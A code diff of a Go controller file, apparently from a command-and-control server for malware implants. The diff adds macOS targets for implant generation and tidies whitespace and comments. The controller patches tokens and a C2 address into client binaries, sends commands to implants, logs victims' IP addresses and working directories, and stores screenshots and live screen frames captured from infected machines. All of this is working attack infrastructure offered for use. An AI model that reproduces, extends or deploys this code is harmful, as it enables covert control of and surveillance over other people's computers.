@@ -1,17 +1,16 @@
-// Package controllers awesomeProject/controllers/implant_controller.go
 package controllers
 
 import (
 	"bytes"
-	"encoding/base64" 
+	"encoding/base64"
 	"fmt"
 	"net/http"
-	"os"            
-	"path/filepath" 
+	"os"
+	"path/filepath"
 	"sort"
 	"strconv"
-	"strings" 
-	"time"    
+	"strings"
+	"time"
 
 	"awesomeProject/config"
 	"awesomeProject/database"
@@ -22,17 +21,19 @@ import (
 
 const (
 	tokenPlaceholder = "deadbeef-0000-0000-0000-000000000000"
-	c2Placeholder    = "C2_IP_PLACEHOLDER_STRING_PADDING_TO_64_BYTES_XXXXXXXXXXXXXXXXXXXXX" 
+	c2Placeholder    = "C2_IP_PLACEHOLDER_STRING_PADDING_TO_64_BYTES_XXXXXXXXXXXXXXXXXXXXX"
 
 	baseClientWindowsRel = "binaries/base_client_windows.exe"
 	baseClientLinuxRel   = "binaries/base_client_linux"
-	baseClientRel        = "binaries/base_client" 
+	baseClientMacOSRel   = "binaries/base_macos"
+	baseClientRel        = "binaries/base_client"
 )
 
 var (
 	baseClientWindowsPath string
 	baseClientLinuxPath   string
-	baseClientPathOld     string 
+	baseClientMacOSPath   string
+	baseClientPathOld     string
 )
 
 func init() {
@@ -51,12 +52,14 @@ func init() {
 		fmt.Printf("WARNING: Linux base binary not found at: '%s'. This must exist for implant generation.\n", baseClientLinuxPath)
 	}
 
-	baseClientPathOld = filepath.Join(wd, baseClientRel)
-	// if _, err := os.Stat(baseClientPathOld); os.IsNotExist(err) {
-	// 	fmt.Printf("WARNING: Legacy base binary not found at: '%s'.\n", baseClientPathOld)
-	// }
+	baseClientMacOSPath = filepath.Join(wd, baseClientMacOSRel)
+	if _, err := os.Stat(baseClientMacOSPath); os.IsNotExist(err) {
+		fmt.Printf("WARNING: macOS base binary not found at: '%s'. This must exist for implant generation.\n", baseClientMacOSPath)
+	}
 
-	fmt.Printf("CONTROLLER.init: Base paths configured. Windows: %s, Linux: %s\n", baseClientWindowsPath, baseClientLinuxPath)
+	baseClientPathOld = filepath.Join(wd, baseClientRel)
+
+	fmt.Printf("CONTROLLER.init: Base paths configured. Windows: %s, Linux: %s, macOS: %s\n", baseClientWindowsPath, baseClientLinuxPath, baseClientMacOSPath)
 }
 
 func saveLivestreamFrameToFile(implantToken string, base64Data string) (string, error) {
@@ -65,7 +68,7 @@ func saveLivestreamFrameToFile(implantToken string, base64Data string) (string, 
 		return "", fmt.Errorf("failed to decode base64 image data: %w", err)
 	}
 
-	screenshotsBaseDir := "c2_screenshots" 
+	screenshotsBaseDir := "c2_screenshots"
 	implantScreenshotsDir := filepath.Join(screenshotsBaseDir, implantToken)
 
 	if err := os.MkdirAll(implantScreenshotsDir, 0750); err != nil {
@@ -97,7 +100,7 @@ func HandleLivestreamFrame(c *gin.Context) {
 	var imp models.Implant
 	if err := config.DB.Where("unique_token = ?", req.ImplantID).First(&imp).Error; err == nil {
 		imp.LastSeen = time.Now()
-		imp.Status = "online" 
+		imp.Status = "online"
 		if errDbSave := config.DB.Save(&imp).Error; errDbSave != nil {
 			fmt.Printf("HandleLivestreamFrame: Error updating implant %s last_seen/status: %v\n", req.ImplantID, errDbSave)
 		}
@@ -126,7 +129,7 @@ func GetScreenshotsForImplant(c *gin.Context) {
 		return
 	}
 
-	screenshotInfoMap := make(map[string]models.ScreenshotInfo) 
+	screenshotInfoMap := make(map[string]models.ScreenshotInfo)
 
 	var commands []models.Command
 	config.DB.Where("implant_id = ? AND command = ? AND status = ?", implantUniqueToken, "screenshot", "executed").
@@ -141,8 +144,8 @@ func GetScreenshotsForImplant(c *gin.Context) {
 			if urlPath != "" && strings.HasSuffix(urlPath, ".png") && strings.HasPrefix(urlPath, expectedPrefix) {
 				filename := filepath.Base(urlPath)
 				screenshotInfoMap[urlPath] = models.ScreenshotInfo{
-					CommandID: cmd.ID,        
-					Timestamp: cmd.UpdatedAt, 
+					CommandID: cmd.ID,
+					Timestamp: cmd.UpdatedAt,
 					URLPath:   urlPath,
 					Filename:  filename,
 				}
@@ -153,7 +156,7 @@ func GetScreenshotsForImplant(c *gin.Context) {
 	implantScreenshotsDir := filepath.Join("c2_screenshots", implantUniqueToken)
 	files, err := os.ReadDir(implantScreenshotsDir)
 
-	if err == nil { 
+	if err == nil {
 		for _, file := range files {
 			if file.IsDir() || !strings.HasSuffix(strings.ToLower(file.Name()), ".png") {
 				continue
@@ -168,7 +171,7 @@ func GetScreenshotsForImplant(c *gin.Context) {
 			if statErr == nil {
 				timestamp = fileInfo.ModTime()
 			} else {
-				timestamp = time.Now() 
+				timestamp = time.Now()
 				fmt.Printf("Warning: Could not stat file %s for implant %s: %v\n", file.Name(), implantUniqueToken, statErr)
 			}
 
@@ -179,7 +182,7 @@ func GetScreenshotsForImplant(c *gin.Context) {
 					timestamp = time.Unix(0, tsInt)
 				}
 			} else if strings.HasPrefix(fn, "screenshot_cmd") && strings.HasSuffix(fn, ".png") {
-				parts := strings.Split(strings.TrimSuffix(fn, ".png"), "_") 
+				parts := strings.Split(strings.TrimSuffix(fn, ".png"), "_")
 				if len(parts) >= 3 {
 					if tsInt, parseErr := strconv.ParseInt(parts[len(parts)-1], 10, 64); parseErr == nil {
 						timestamp = time.Unix(0, tsInt)
@@ -188,7 +191,7 @@ func GetScreenshotsForImplant(c *gin.Context) {
 			}
 
 			if entryExists {
-				existingInfo.Timestamp = timestamp 
+				existingInfo.Timestamp = timestamp
 				screenshotInfoMap[urlPath] = existingInfo
 			} else {
 				screenshotInfoMap[urlPath] = models.ScreenshotInfo{
@@ -202,13 +205,11 @@ func GetScreenshotsForImplant(c *gin.Context) {
 		fmt.Printf("Error reading screenshot directory %s for implant %s: %v\n", implantScreenshotsDir, implantUniqueToken, err)
 	}
 
-	// Convert map to slice
 	var allScreenshotInfos []models.ScreenshotInfo
 	for _, info := range screenshotInfoMap {
 		allScreenshotInfos = append(allScreenshotInfos, info)
 	}
 
-	// Sort all screenshots by timestamp, newest first
 	sort.Slice(allScreenshotInfos, func(i, j int) bool {
 		return allScreenshotInfos[i].Timestamp.After(allScreenshotInfos[j].Timestamp)
 	})
@@ -217,7 +218,6 @@ func GetScreenshotsForImplant(c *gin.Context) {
 	c.JSON(http.StatusOK, gin.H{"screenshots": allScreenshotInfos})
 }
 
-// Helper function to save screenshot to a file
 func saveScreenshotToFile(implantToken string, commandID int, base64Data string) (string, error) {
 	imgBytes, err := base64.StdEncoding.DecodeString(base64Data)
 	if err != nil {
@@ -240,7 +240,7 @@ func saveScreenshotToFile(implantToken string, commandID int, base64Data string)
 
 	absFilePath, _ := filepath.Abs(filePath)
 	fmt.Printf("Screenshot saved: %s (Implant: %s, CommandID: %d)\n", absFilePath, implantToken, commandID)
-	return filePath, nil 
+	return filePath, nil
 }
 
 func HandleCommandResult(c *gin.Context) {
@@ -259,12 +259,6 @@ func HandleCommandResult(c *gin.Context) {
 		return
 	}
 
-	// Optional: Prevent re-processing if already executed, uncomment if strict behavior needed
-	// if cmd.Status == "executed" {
-	// 	c.JSON(http.StatusBadRequest, gin.H{"error": "Command already marked as executed"})
-	// 	return
-	// }
-
 	var imp models.Implant
 	if err := config.DB.Where("unique_token = ?", cmd.ImplantID).First(&imp).Error; err == nil {
 		imp.LastSeen = time.Now()
@@ -276,9 +270,8 @@ func HandleCommandResult(c *gin.Context) {
 		fmt.Printf("HandleCommandResult: Warning - Could not find implant %s to update last_seen/status.\n", cmd.ImplantID)
 	}
 
-	outputToStoreInDB := req.Output 
+	outputToStoreInDB := req.Output
 
-	// --- Screenshot specific logic ---
 	if cmd.Command == "screenshot" && strings.HasPrefix(req.Output, "screenshot_data:") {
 		base64ImageData := strings.TrimPrefix(req.Output, "screenshot_data:")
 
@@ -306,10 +299,10 @@ func GenerateImplant(c *gin.Context) {
 	userID := userIfc.(int)
 
 	var req struct {
-		TargetOS string `json:"target_os" binding:"required,oneof=windows linux"`
+		TargetOS string `json:"target_os" binding:"required,oneof=windows linux macos"`
 	}
 	if err := c.ShouldBindJSON(&req); err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request: 'target_os' (windows/linux) is required. " + err.Error()})
+		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request: 'target_os' (windows/linux/macos) is required. " + err.Error()})
 		return
 	}
 
@@ -371,7 +364,7 @@ func DownloadConfiguredImplant(c *gin.Context) {
 		c.JSON(http.StatusInternalServerError, gin.H{"error": "Token placeholder not found in base client binary."})
 		return
 	}
-	if len(implantDBUniqueToken) > len(tokenPlaceholder) { 
+	if len(implantDBUniqueToken) > len(tokenPlaceholder) {
 		c.JSON(http.StatusInternalServerError, gin.H{"error": "Critical error: Implant ID too long for patching."})
 		return
 	}
@@ -422,7 +415,7 @@ func SendCommand(c *gin.Context) {
 		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request payload"})
 		return
 	}
-	imp, err := database.GetImplantByID(req.ImplantID) 
+	imp, err := database.GetImplantByID(req.ImplantID)
 	if err != nil {
 		c.JSON(http.StatusNotFound, gin.H{"error": "Implant not found"})
 		return
@@ -432,7 +425,7 @@ func SendCommand(c *gin.Context) {
 		return
 	}
 	cmd := models.Command{
-		ImplantID: req.ImplantID, 
+		ImplantID: req.ImplantID,
 		Command:   req.Command,
 		Status:    "pending",
 	}
@@ -473,7 +466,7 @@ func ImplantClientFetchCommands(c *gin.Context) {
 
 func DashboardGetCommandsForImplant(c *gin.Context) {
 	userID := c.MustGet("user_id").(int)
-	implantUniqueToken := c.Param("implant_id") 
+	implantUniqueToken := c.Param("implant_id")
 	if implantUniqueToken == "" {
 		c.JSON(http.StatusBadRequest, gin.H{"error": "Implant ID (unique_token) is required"})
 		return
@@ -493,9 +486,9 @@ func DashboardGetCommandsForImplant(c *gin.Context) {
 
 func CheckinImplant(c *gin.Context) {
 	var req struct {
-		ImplantID string `json:"implant_id"` 
-		IPAddress string `json:"ip_address"` 
-		PWD       string `json:"pwd"`        
+		ImplantID string `json:"implant_id"`
+		IPAddress string `json:"ip_address"`
+		PWD       string `json:"pwd"`
 	}
 	if err := c.ShouldBindJSON(&req); err != nil {
 		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request payload for check-in: " + err.Error()})
@@ -539,7 +532,6 @@ func DeleteImplant(c *gin.Context) {
 	c.JSON(http.StatusOK, gin.H{"message": "Implant and associated commands deleted successfully"})
 }
 
-// /legacy download endpoint.
 func DownloadImplant(c *gin.Context) {
 	implantDBUniqueToken := c.Param("implant_id")
 	userID := c.MustGet("user_id").(int)
@@ -574,9 +566,6 @@ func DownloadImplant(c *gin.Context) {
 	paddedToken := make([]byte, len(tokenPlaceholder))
 	copy(paddedToken, []byte(implantDBUniqueToken))
 	copy(patchedData[idx:], paddedToken)
-
-	// This legacy download does not patch C2_IP. Assumes it's hardcoded or not needed.
-	// Or that the baseClientPathOld binary is somehow pre-configured for C2.
 
 	outName := fmt.Sprintf("implant_legacy_%s.bin", implantDBUniqueToken) // Generic extension
 	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s\"", outName))
